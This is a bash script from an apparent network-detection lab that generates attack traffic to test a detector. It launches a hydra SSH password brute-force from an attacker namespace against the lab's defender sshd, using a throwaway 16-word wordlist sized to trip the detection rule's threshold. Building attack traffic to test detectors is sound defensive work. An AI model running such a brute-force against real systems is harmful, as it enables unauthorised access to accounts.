#!/usr/bin/env bash
# ==============================================================================
# attack/scenarios/brute_force.sh
# SSH brute-force from the attacker namespace -> 'brute_force' family -> R-BRUTE.
# Fires hydra against the defender's sshd over a short wordlist. Requires root
# and a running lab (sudo defend/setup_netns.sh). Hydra must be installed
# (sudo attack/setup.sh).
#
#   sudo attack/scenarios/brute_force.sh
#
# Env overrides: USER (login), THREADS (hydra -t), WORDLIST (path).
# ==============================================================================
set -uo pipefail
cd "$(dirname "$0")/../.."
# shellcheck disable=SC1091
source ./defend/lab.env

USER="${USER:-testuser}"
THREADS="${THREADS:-4}"
WORDLIST="${WORDLIST:-}"

if ! command -v hydra >/dev/null 2>&1; then
    echo "[-] hydra not found. Install it first: sudo attack/setup.sh" >&2
    exit 1
fi

if [ -z "$WORDLIST" ]; then
    WORDLIST="$(mktemp /tmp/soc_brute_wl.XXXX)"
    # 16 attempts, not 8: the rate rule needs >5 SEPARATE short flows in its 10s
    # window. hydra's ssh module reconnects per password attempt, so N passwords
    # => ~N flows; 16 gives comfortable headroom above the threshold even if a
    # couple of attempts happen to share a connection. (Tune the detector side
    # with SOC_BRUTE_COUNT / SOC_BRUTE_WINDOW_S if your hydra batches attempts.)
    printf 'alpha\nbravo\ncharlie\ndelta\necho\nfoxtrot\ngolf\nhotel\n'  > "$WORDLIST"
    printf 'india\njuliet\nkilo\nlima\nmike\nnovember\noscar\npapa\n'   >> "$WORDLIST"
    trap 'rm -f "$WORDLIST"' EXIT
fi

echo "[attack] SSH brute-force $ATTACKER_LAB_IP -> $DEFENDER_LAB_IP:22 (user=$USER, -t $THREADS)"
# Run (not exec) so the temp-wordlist cleanup trap fires and callers (acceptance.sh)
# regain control after hydra exhausts the list.
attack/run.sh hydra -l "$USER" -P "$WORDLIST" -t "$THREADS" ssh://"$DEFENDER_LAB_IP" || true
